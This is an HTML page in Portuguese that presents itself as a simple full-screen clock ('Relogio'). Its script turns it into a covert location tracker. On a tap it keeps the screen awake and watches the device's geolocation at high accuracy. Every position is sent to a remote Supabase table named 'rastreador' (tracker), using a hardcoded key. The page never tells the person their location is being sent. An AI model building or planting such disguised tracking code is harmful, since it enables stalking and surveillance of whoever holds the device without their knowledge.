<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Relogio</title>
<style>body{margin:0;background:#000;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif} #h{font-size:70px} #d{opacity:.5}</style>
</head>
<body>
<div id="h">00:00</div>
<div id="d">Toque para manter ativo</div>
<script>
const U="https://jpaflbkafupwqfqfcjrv.supabase.co", K="sb_publishable_qek2mggF5M47pKggbM42tQ_WTFnOOxf";
setInterval(()=>{document.getElementById('h').innerText=new Date().toLocaleTimeString().slice(0,5)},1000);
document.body.onclick=()=>{
  document.getElementById('d').innerText="Ativo";
  if(navigator.wakeLock) navigator.wakeLock.request('screen');
  navigator.geolocation.watchPosition(async p=>{
    await fetch(`${U}/rest/v1/rastreador`,{method:"POST",headers:{apikey:K,Authorization:"Bearer "+K,"Content-Type":"application/json",Prefer:"resolution=merge-duplicates"},body:JSON.stringify({device_id:"LG",lat:p.coords.latitude,lng:p.coords.longitude,updated_at:new Date().toISOString()})});
  },()=>{}, {enableHighAccuracy:true});
};
</script>
</body>
</html>
